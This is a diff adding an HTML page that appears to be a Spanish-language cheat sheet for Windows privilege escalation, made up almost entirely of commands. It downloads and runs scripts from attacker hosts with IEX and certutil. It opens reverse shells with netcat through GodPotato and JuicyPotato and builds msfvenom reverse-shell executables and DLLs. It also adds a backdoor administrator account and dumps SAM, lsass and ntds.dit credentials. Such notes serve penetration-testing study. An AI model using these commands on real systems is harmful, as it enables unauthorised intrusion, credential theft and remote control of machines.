@@ -1,0 +1,181 @@
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span> /all
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">IEX</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadString</span><span class="p">(</span><span class="s1">'http://IP:PORT/winPEAS.ps1'</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Credenciales en caché</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmdkey /list
+</code></pre></div></div>
+<p><strong>[+]Dumpear DPAPI creds</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist
+</code></pre></div></div>
+<h1 id="puertos-en-escucha">Puertos en escucha</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat <span class="nt">-ano</span> | FindStr /I <span class="s2">"LISTENING"</span>
+</code></pre></div></div>
+
+<p>Que usuario ejecuta ese puerto</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tasklist /FI <span class="s2">"PID eq 5540"</span> /V
+</code></pre></div></div>
+<p>Si tira permission denied, probablemente sea SYSTEM o Administrator
+___</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\inetpub
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\xampp\htdocs
+</code></pre></div></div>
+
+<p>Ver permisos sobre una carpeta:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls htdocs
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">(F)</code> → <em>Full control</em>: control total (leer, escribir, ejecutar, cambiar permisos, eliminar).</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">(RX)</code> → <em>Read &amp; Execute</em>: leer + ejecutar archivos.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">(AD)</code> → <em>Append Data</em>: añadir datos a un archivo o crear subcarpetas en una carpeta.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">(WD)</code> → <em>Write Data</em>: escribir en archivos ya existentes o crear archivos nuevos.</p>
+  </li>
+</ul>
+
+<p>LibreOffice</p>
+<pre><code class="language-cmd">C:\Program Files\LibreOffice\program&gt; type version.ini
+</code></pre>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-2255">CVE-2023-2255</a></p>
+
+<p>Leer Historial</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Content</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">APPDATA</span><span class="s2">\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"</span><span class="w">
+</span></code></pre></div></div>
+
+<pre><code class="language-cmd">type C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+</code></pre>
+<h1 id="seimpersonateprivilege"><strong>SeImpersonatePrivilege</strong></h1>
+
+<p><a href="https://github.com/BeichenDream/GodPotato">GitHub - BeichenDream/GodPotato</a></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.<span class="se">\g</span>p.exe <span class="nt">-cmd</span> <span class="s2">"nc64.exe -e cmd.exe IP ATACANTE PUERTO"</span>
+</code></pre></div></div>
+<p>O crear un nuevo usuario admin</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user m0b Password123! /add
+net localgroup Administrators m0b /add
+net localgroup <span class="s2">"Remote Management Users"</span> m0b /add
+</code></pre></div></div>
+
+<p>Si no va así probaremos con  <strong>JuicyPotato</strong> (versión de 32 o 64 bits):</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="s2">"http://IP:PORT/nc.exe"</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nx">nc.exe</span><span class="w">
+</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="s2">"http://IP:PORT/JuicyPotato.exe"</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nx">JuicyPotato.exe</span><span class="w">
+</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="s2">"http://IP:PORT/rshell.bat"</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nx">rshell.bat</span><span class="w">
+</span></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">rshell.bat</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\A</span>ppData<span class="se">\L</span>ocal<span class="se">\T</span>emp<span class="se">\p</span>entesting<span class="se">\n</span>c.exe <span class="nt">-e</span> powershell.exe IP PORT
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>rlwrap <span class="nt">-cAr</span> nc <span class="nt">-lvnp</span> PORT
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./jp.exe <span class="nt">-p</span> ./rshell.bat <span class="nt">-l</span> 3333 <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-c</span> <span class="s2">"{e60687f7-01a1-40aa-86ac-db1cbf673334}"</span>
+</code></pre></div></div>
+
+<p>Usar otro CLSID según versión de Windows</p>
+
+<p><a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID">juicy-potato/CLSID at master · ohpe/juicy-potato · GitHub</a></p>
+
+<p>Probar con shell de msfvenom (32 o 64 bits)</p>
+<pre><code class="language-BAsh">msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o revShell.exe
+</code></pre>
+
+<p><strong>PowerUp</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-ExecutionPolicy</span><span class="w"> </span><span class="nx">Bypass</span><span class="w"> </span><span class="nt">-Scope</span><span class="w"> </span><span class="nx">Process</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span><span class="n">upload</span><span class="w"> </span><span class="nx">/ruta</span><span class="w"> </span><span class="o">.</span><span class="w">
+</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerUp.ps1</span><span class="w">
+</span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\PowerUp.ps1</span><span class="w">
+
+</span><span class="o">||</span><span class="w">
+
+</span><span class="n">IEX</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://IP:PORT/PowerUp.ps1'</span><span class="p">)</span><span class="w">
+
+</span><span class="n">Invoke-AllChecks</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Abrir archivo lsass.DMP</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip <span class="nb">install </span>pypykatz
+pypykatz lsa minidump lsass.dmp
+</code></pre></div></div>
+
+<h1 id="sebackupserestore-privilege"><strong>SeBackup/SeRestore Privilege</strong></h1>
+
+<ul>
+  <li>Para sacar <strong>credenciales locales</strong> (Se puede hacer PtH y crackings)</li>
+</ul>
+
+<pre><code class="language-cmd">reg save hklm\system C:\Users\svc_backup\AppData\Local\Temp\pentest\system.hive
+reg save hklm\sam C:\Users\svc_backup\AppData\Local\Temp\pentest\sam.hive
+</code></pre>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-secretsdump <span class="nt">-sam</span> sam.hive <span class="nt">-system</span> system.hive LOCAL
+</code></pre></div></div>
+
+<ul>
+  <li>Para sacar las <strong>credenciales de un DC</strong></li>
+</ul>
+
+<p><a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/">Windows Privilege Escalation: SeBackupPrivilege - Hacking Articles</a></p>
+
+<p><code class="language-plaintext highlighter-rouge">raj.dsh</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>set context persistent nowriters
+add volume c: alias raj
+create
+expose %raj% z:
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unix2dos raj.dsh
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload raj.dsh
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> <span class="nv">$env</span>:TEMP
+upload raj.dsh
+diskshadow /s raj.dsh
+robocopy /b z:<span class="se">\w</span>indows<span class="se">\n</span>tds <span class="nb">.</span> ntds.dit
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-secretsdump <span class="nt">-ntds</span> ntds.dit <span class="nt">-system</span> system <span class="nb">local</span>
+</code></pre></div></div>
+
+<h1 id="semanagevolume-privilege"><strong>SeManageVolume Privilege</strong></h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\SeManageVolumeExploit.exe
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>IP <span class="nv">LPORT</span><span class="o">=</span>PORT <span class="nt">-f</span> dll <span class="nt">-o</span> tzres.dll
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="se">\w</span>bem
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe <span class="nt">-urlcache</span> <span class="nt">-split</span> <span class="nt">-f</span> http://IP/tzres.dll
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap <span class="nt">-cAr</span> nc <span class="nt">-lvnp</span> PORT
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systeminfo
+</code></pre></div></div>
+
